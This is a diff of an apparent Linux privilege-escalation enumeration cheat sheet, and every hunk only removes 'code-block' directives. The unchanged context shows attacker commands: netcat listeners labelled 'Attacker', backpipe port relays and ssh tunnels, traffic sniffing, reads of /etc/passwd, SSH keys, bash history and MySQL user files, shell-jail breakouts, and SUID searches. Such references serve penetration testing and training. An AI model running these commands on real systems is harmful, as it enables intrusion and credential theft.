@@ -43,7 +43,7 @@ Operating System
 
 **What's the distribution type? What version?**
 
-.. code-block:: bash
+ 
 
     cat /etc/issue
     cat /etc/*-release
@@ -53,7 +53,7 @@ Operating System
 
 **What's the kernel version? Is it 64-bit?**
 
-.. code-block:: bash
+ 
 
     cat /proc/version
     uname -a
@@ -65,7 +65,7 @@ Operating System
 
 **What can be learnt from the environmental variables?**
 
-.. code-block:: bash
+ 
 
     cat /etc/profile
     cat /etc/bashrc
@@ -77,7 +77,7 @@ Operating System
 
 **Is there a printer?**
 
-.. code-block:: bash
+ 
 
     lpstat -a
 
@@ -86,7 +86,7 @@ Applications & Services
 
 **What services are running? Which service has which user privilege?**
 
-.. code-block:: bash
+ 
 
     ps aux
     ps -ef
@@ -95,7 +95,7 @@ Applications & Services
 
 **Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!**
 
-.. code-block:: bash
+ 
 
     ps aux | grep root
     ps -ef | grep root
@@ -103,7 +103,7 @@ Applications & Services
 
 **What applications are installed? What version are they? Are they currently running?**
 
-.. code-block:: bash
+ 
 
     ls -alh /usr/bin/
     ls -alh /sbin/
@@ -114,7 +114,7 @@ Applications & Services
 
 **Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?**
 
-.. code-block:: bash
+ 
 
     cat /etc/syslog.conf
     cat /etc/chttp.conf
@@ -129,7 +129,7 @@ Applications & Services
 
 **What jobs are scheduled?**
 
-.. code-block:: bash
+ 
 
     crontab -l
     ls -alh /var/spool/cron
@@ -146,7 +146,7 @@ Applications & Services
 
 **Any plain text usernames and/or passwords?**
 
-.. code-block:: bash
+ 
 
     grep -i user [filename]
     grep -i pass [filename]
@@ -158,7 +158,7 @@ Communications & Networking
 
 **What NIC(s) does the system have? Is it connected to another network?**
 
-.. code-block:: bash
+ 
 
     /sbin/ifconfig -a
     cat /etc/network/interfaces
@@ -166,7 +166,7 @@ Communications & Networking
 
 **What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?**
 
-.. code-block:: bash
+ 
 
     cat /etc/resolv.conf
     cat /etc/sysconfig/network
@@ -177,7 +177,7 @@ Communications & Networking
 
 **What other users & hosts are communicating with the system?**
 
-.. code-block:: bash
+ 
 
     lsof -i
     lsof -i :80
@@ -192,7 +192,7 @@ Communications & Networking
 
 **Whats cached? IP and/or MAC addresses**
 
-.. code-block:: bash
+ 
 
     arp -e
     route
@@ -200,14 +200,14 @@ Communications & Networking
 
 **Is packet sniffing possible? What can be seen? Listen to live traffic**
 
-.. code-block:: bash
+ 
 
     tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
     tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
 
 **Have you got a shell? Can you interact with the system?**
 
-.. code-block:: bash
+ 
 
     nc -lvp 4444    # Attacker. Input (Commands)
     nc -lvp 4445    # Attacker. Ouput (Results)
@@ -219,20 +219,20 @@ Note: http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
 
 Note: FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
 
-.. code-block:: bash
+ 
 
     FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
 
 Note: ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
 
-.. code-block:: bash
+ 
 
     ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
     ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
 
 Note: mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe
 
-.. code-block:: bash
+ 
 
     mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe    # Port Relay
     mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
@@ -240,7 +240,7 @@ Note: mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [loca
 
 **Is tunnelling possible? Send commands locally, remotely**
 
-.. code-block:: bash
+ 
 
     ssh -D 127.0.0.1:9050 -N [username]@[ip]
     proxychains ifconfig
@@ -250,7 +250,7 @@ Confidential Information & Users
 
 **Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?**
 
-.. code-block:: bash
+ 
 
     id
     who
@@ -264,7 +264,7 @@ Confidential Information & Users
 
 **What sensitive files can be found?**
 
-.. code-block:: bash
+ 
 
     cat /etc/passwd
     cat /etc/group
@@ -273,14 +273,14 @@ Confidential Information & Users
 
 **Anything "interesting" in the home directorie(s)? If it's possible to access**
 
-.. code-block:: bash
+ 
 
     ls -ahlR /root/
     ls -ahlR /home/
 
 **Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords**
 
-.. code-block:: bash
+ 
 
     cat /var/apache2/config.inc
     cat /var/lib/mysql/mysql/user.MYD
@@ -288,7 +288,7 @@ Confidential Information & Users
 
 **What has the user being doing? Is there any password in plain text? What have they been edting?**
 
-.. code-block:: bash
+ 
 
     cat ~/.bash_history
     cat ~/.nano_history
@@ -298,7 +298,7 @@ Confidential Information & Users
 
 **What user information can be found?**
 
-.. code-block:: bash
+ 
 
     cat ~/.bashrc
     cat ~/.profile
@@ -307,7 +307,7 @@ Confidential Information & Users
 
 **Can private-key information be found?**
 
-.. code-block:: bash
+ 
 
     cat ~/.ssh/authorized_keys
     cat ~/.ssh/identity.pub
@@ -330,7 +330,7 @@ File Systems
 
 **Which configuration files can be written in /etc/? Able to reconfigure a service?**
 
-.. code-block:: bash
+ 
 
     ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
     ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
@@ -342,7 +342,7 @@ File Systems
 
 **What can be found in /var/ ?**
 
-.. code-block:: bash
+ 
 
     ls -alh /var/log
     ls -alh /var/mail
@@ -354,7 +354,7 @@ File Systems
 
 **Any settings/files (hidden) on website? Any settings file with database information?**
 
-.. code-block:: bash
+ 
 
     ls -alhR /var/www/
     ls -alhR /srv/www/htdocs/
@@ -364,7 +364,7 @@ File Systems
 
 **Is there anything in the log file(s) (Could help with "Local File Includes"!)**
 
-.. code-block:: bash
+ 
 
     cat /etc/httpd/logs/access_log
     cat /etc/httpd/logs/access.log
@@ -411,7 +411,7 @@ Note: http://www.thegeekstuff.com/2011/08/linux-var-log-files/
 
 **If commands are limited, you break out of the "jail" shell?**
 
-.. code-block:: bash
+ 
 
     python -c 'import pty;pty.spawn("/bin/bash")'
     echo os.system('/bin/bash')
@@ -419,20 +419,20 @@ Note: http://www.thegeekstuff.com/2011/08/linux-var-log-files/
 
 **How are file-systems mounted?**
 
-.. code-block:: bash
+ 
 
     mount
     df -h
 
 **Are there any unmounted file-systems?**
 
-.. code-block:: bash
+ 
 
     cat /etc/fstab
 
 **What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID**
 
-.. code-block:: bash
+ 
 
     find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
     find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
@@ -446,7 +446,7 @@ Note: http://www.thegeekstuff.com/2011/08/linux-var-log-files/
 
 **Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm**
 
-.. code-block:: bash
+ 
 
     find / -writable -type d 2>/dev/null      # world-writeable folders
     find / -perm -222 -type d 2>/dev/null     # world-writeable folders
@@ -458,14 +458,14 @@ Note: http://www.thegeekstuff.com/2011/08/linux-var-log-files/
 
 **Any "problem" files? Word-writeable, "nobody" files**
 
-.. code-block:: bash
+ 
 
     find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
     find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
 
 **What files can our user specifically write to?**
 
-.. code-block:: bash
+ 
 
     groups | cut -d' ' -f3- | tr ' ' '\n' | while read user; do echo $user; find / -group $user -perm -g=w -exec ls -l {} \; 2> /dev/null; done # Find files which our user groups have write access to.
     find / -user `whoami` # Find files owned by our user.
@@ -475,7 +475,7 @@ Preparation & Finding Exploit Code
 
 **What development tools/languages are installed/supported?**
 
-.. code-block:: bash
+ 
 
     find / -name perl*
     find / -name python*
@@ -484,7 +484,7 @@ Preparation & Finding Exploit Code
 
 **How can files be uploaded?**
 
-.. code-block:: bash
+ 
 
     find / -name wget
     find / -name nc*
